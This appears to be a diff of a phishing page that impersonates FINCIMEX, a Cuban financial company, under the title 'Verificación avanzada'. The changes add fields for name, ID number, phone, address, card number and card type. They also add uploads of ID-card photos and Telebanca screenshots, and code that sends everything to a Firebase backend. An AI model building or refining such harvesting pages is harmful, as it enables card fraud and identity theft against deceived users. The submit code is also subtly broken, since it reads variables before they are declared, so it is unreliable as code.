@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Verificación Completada • FINCIMEX</title>
+<title>Verificación Avanzada • FINCIMEX</title>
 
 <style>
 body{
@@ -11,7 +11,7 @@ body{
   padding:0;
   font-family:"Segoe UI", Arial, sans-serif;
   background:#00111f url("img/fondo3.jpg") no-repeat center/cover;
-  height:100vh;
+  min-height:100vh;
   display:flex;
   flex-direction:column;
   justify-content:center;
@@ -19,54 +19,39 @@ body{
   color:white;
   animation:fadeIn 1s ease;
 }
-@keyframes fadeIn{
-  from{opacity:0;} to{opacity:1;}
-}
+@keyframes fadeIn{ from{opacity:0;} to{opacity:1;} }
 
 .caja{
   background:rgba(0,0,0,0.55);
   padding:40px 30px;
   border-radius:20px;
-  width:90%;
-  max-width:400px;
+  width:92%;
+  max-width:420px;
   text-align:center;
   backdrop-filter: blur(4px);
   animation:scale 1.1s ease;
 }
-
-@keyframes scale{
-  from{transform:scale(0.8); opacity:0;} 
-  to{transform:scale(1); opacity:1;}
-}
-
-.icono{
-  font-size:70px;
-  color:#00ff7f;
-  margin-bottom:15px;
-}
-
-h1{
-  font-size:28px;
-  margin-bottom:15px;
-}
-
-p{
-  margin-top:0;
-  margin-bottom:25px;
-  font-size:16px;
-  color:#e2e2e2;
-}
+@keyframes scale{ from{transform:scale(0.8); opacity:0;} to{transform:scale(1); opacity:1;} }
 
 input, select{
   width:100%;
   padding:12px;
-  margin:8px 0;
+  margin:10px 0;
   font-size:16px;
   border-radius:8px;
   border:none;
   outline:none;
-  background: rgba(255,255,255,0.1);
+  background: rgba(255,255,255,0.08);
   color:white;
+}
+
+label{
+  text-align:left;
+  width:100%;
+  display:block;
+  margin-top:10px;
+  color:#ffd700;
+  font-weight:600;
 }
 
 .boton{
@@ -82,93 +67,135 @@ input, select{
   font-weight:600;
   cursor:pointer;
 }
-.boton:hover{
-  background:#007fcc;
-}
-
-.boton-secondary{
-  background:#666;
-  margin-left:10px;
-}
-.boton-secondary:hover{
-  background:#444;
-}
+.boton:hover{ background:#007fcc; }
 
 footer{
-  position:absolute;
-  bottom:20px;
-  text-align:center;
-  width:100%;
+  margin-top:20px;
   color:#fff;
-  opacity:0.8;
+  opacity:0.7;
 }
 </style>
 </head>
 <body>
 
 <div class="caja">
-  <div class="icono">✔</div>
-  <h1>Verificación Completada</h1>
-  <p>Por favor completa los datos de verificación de tu tarjeta.</p>
+  <h2>Verificación avanzada</h2>
+  <p>Completa los datos y sube las imágenes requeridas.</p>
 
-  <!-- Formulario de verificación -->
-  <input type="text" id="nombre" placeholder="Nombre completo">
-  <input type="text" id="tarjeta" placeholder="Número de tarjeta">
-  <input type="text" id="cedula" placeholder="Cédula / ID">
-  <select id="tipo">
-    <option value="">Tipo de tarjeta</option>
-    <option value="CUP">CUP</option>
-    <option value="MLC">MLC</option>
-    <option value="AIS CUP">AIS CUP</option>
-    <option value="AIS USD/MLC">AIS USD/MLC</option>
+  <!-- DATOS PERSONALES -->
+  <input id="nombre" type="text" placeholder="Nombre completo">
+  <input id="cedula" type="text" placeholder="Carnet / ID">
+  <input id="telefono" type="text" placeholder="Teléfono">
+  <input id="direccion" type="text" placeholder="Dirección completa">
+  <select id="provincia">
+    <option value="">Provincia</option>
+    <option>La Habana</option><option>Santiago de Cuba</option><option>Holguín</option>
+    <option>Villa Clara</option><option>Matanzas</option><option>Cienfuegos</option>
+    <option>Granma</option><option>Las Tunas</option><option>Camagüey</option>
+    <option>Pinar del Río</option><option>Artemisa</option><option>Mayabeque</option>
+    <option>Guantánamo</option><option>Isla de la Juventud</option>
   </select>
 
-  <button class="boton" onclick="guardarDatos()">Enviar Datos</button>
-  <a href="index.html" class="boton boton-secondary">Volver al inicio</a>
+  <!-- TARJETA -->
+  <input id="tarjeta" type="text" placeholder="Número de tarjeta">
+  <select id="tipo" onchange="mostrarCampos()">
+    <option value="">Tipo de tarjeta</option>
+    <option>CUP</option>
+    <option>MLC</option>
+    <option>AIS CUP</option>
+    <option>AIS USD/MLC</option>
+  </select>
+
+  <!-- CAMPOS DEPENDIENDO DEL TIPO -->
+  <div id="camposExtra"></div>
+
+  <button class="boton" onclick="enviarDatos()">Enviar verificación</button>
+  <a href="index.html" class="boton" style="background:#666;margin-top:10px;">Volver</a>
 </div>
 
-<footer>
-  FINCIMEX • Todos los derechos reservados
-</footer>
+<footer>FINCIMEX • Todos los derechos reservados</footer>
 
-<!-- ===== Firebase JS ===== -->
+<!-- Firebase -->
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-storage-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
 <script src="js/firebase.js"></script>
 
 <script>
-function guardarDatos(){
-  const nombre = document.getElementById("nombre").value.trim();
-  const tarjeta = document.getElementById("tarjeta").value.trim();
-  const cedula = document.getElementById("cedula").value.trim();
+function mostrarCampos(){
+  const tipo = document.getElementById("tipo").value;
+  const box = document.getElementById("camposExtra");
+
+  if(tipo === "CUP" || tipo === "MLC"){
+    box.innerHTML = `
+      <label>Foto del Carnet (Frontal)</label>
+      <input type="file" id="carnetFrontal">
+      
+      <label>Foto del Carnet (Trasera)</label>
+      <input type="file" id="carnetTrasera">
+
+      <label>Foto Telebanca o comprobante</label>
+      <input type="file" id="telebanca">
+    `;
+  }
+  else {
+    box.innerHTML = `
+      <label>Foto del Carnet del titular</label>
+      <input type="file" id="carnetFrontal">
+
+      <label>Último comprobante</label>
+      <input type="file" id="comprobante">
+    `;
+  }
+}
+
+async function subirArchivo(file, ruta){
+  const ref = firebase.storage().ref().child(ruta);
+  await ref.put(file);
+  return await ref.getDownloadURL();
+}
+
+async function enviarDatos(){
+  const nombre = nombre.value.trim();
+  const cedula = cedula.value.trim();
+  const telefono = telefono.value.trim();
+  const direccion = direccion.value.trim();
+  const provincia = provincia.value;
+  const tarjeta = tarjeta.value.trim();
   const tipo = document.getElementById("tipo").value;
 
-  if(!nombre || !tarjeta || !cedula || !tipo){
-    alert("Por favor completa todos los campos.");
+  if(!nombre || !cedula || !telefono || !direccion || !provincia || !tarjeta || !tipo){
+    alert("Rellene todos los datos obligatorios.");
     return;
   }
 
-  // Guardar en Firebase Firestore
-  db.collection("verificaciones_completas").add({
-    nombre: nombre,
-    tarjeta: tarjeta,
-    cedula: cedula,
-    tipo: tipo,
-    timestamp: new Date()
-  })
-  .then(() => {
-    alert("✅ Datos guardados correctamente.");
-    // Limpiar formulario
-    document.getElementById("nombre").value = "";
-    document.getElementById("tarjeta").value = "";
-    document.getElementById("cedula").value = "";
-    document.getElementById("tipo").value = "";
-  })
-  .catch(err => {
-    console.error("❌ Error guardando datos:", err);
-    alert("Ocurrió un error al guardar los datos. Intenta nuevamente.");
+  let urls = {};
+
+  // SUBE LAS IMÁGENES
+  if(tipo === "CUP" || tipo === "MLC"){
+    urls.carnetFrontal = await subirArchivo(carnetFrontal.files[0], "verificaciones/"+cedula+"/carnetFrontal.jpg");
+    urls.carnetTrasera = await subirArchivo(carnetTrasera.files[0], "verificaciones/"+cedula+"/carnetTrasera.jpg");
+    urls.telebanca = await subirArchivo(telebanca.files[0], "verificaciones/"+cedula+"/telebanca.jpg");
+  } else {
+    urls.carnetFrontal = await subirArchivo(carnetFrontal.files[0], "verificaciones/"+cedula+"/carnetFrontal.jpg");
+    urls.comprobante = await subirArchivo(comprobante.files[0], "verificaciones/"+cedula+"/comprobante.jpg");
+  }
+
+  // GUARDA EN FIRESTORE
+  await db.collection("verificaciones").add({
+    nombre,
+    cedula,
+    telefono,
+    direccion,
+    provincia,
+    tarjeta,
+    tipo,
+    archivos: urls,
+    fecha: new Date()
   });
+
+  alert("✔ Verificación enviada correctamente.");
+  window.location.href = "index.html";
 }
 </script>
 
